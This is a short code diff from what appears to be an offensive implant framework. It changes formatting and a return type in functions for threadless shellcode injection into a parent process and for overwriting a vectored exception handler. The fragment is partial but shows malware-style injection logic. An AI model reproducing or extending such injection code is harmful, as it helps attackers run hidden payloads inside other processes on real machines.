@@ -7,11 +7,11 @@ namespace Injection {
     VOID Threadless(const _threadless &writer, void *shellcode, size_t n_shellcode, size_t total) {
         HEXANE
 
-        HANDLE process = { };
-        UINT_PTR ex_addr = 0;
-        UINT_PTR ex_addr_p = 0;
-        UINT_PTR hook = 0;
-        SIZE_T write = 0;
+        HANDLE process      = { };
+        UINT_PTR ex_addr    = 0;
+        UINT_PTR ex_addr_p  = 0;
+        UINT_PTR hook       = 0;
+        SIZE_T write        = 0;
 
         if (!(ex_addr = Memory::Modules::LoadExportAddress(writer.module, writer.exp)) ||
             !(process = Process::OpenParentProcess(writer.parent)) ||
@@ -94,7 +94,7 @@ namespace Injection {
             return encoded;
         }
 
-        LONG OverwriteFirstHandler(_veh_writer const &writer) {
+        NTSTATUS OverwriteFirstHandler(_veh_writer const &writer) {
             HEXANE
 
             const auto mod_hash = Utils::GetHashFromStringW(writer.mod_name, x_wcslen(writer.mod_name));
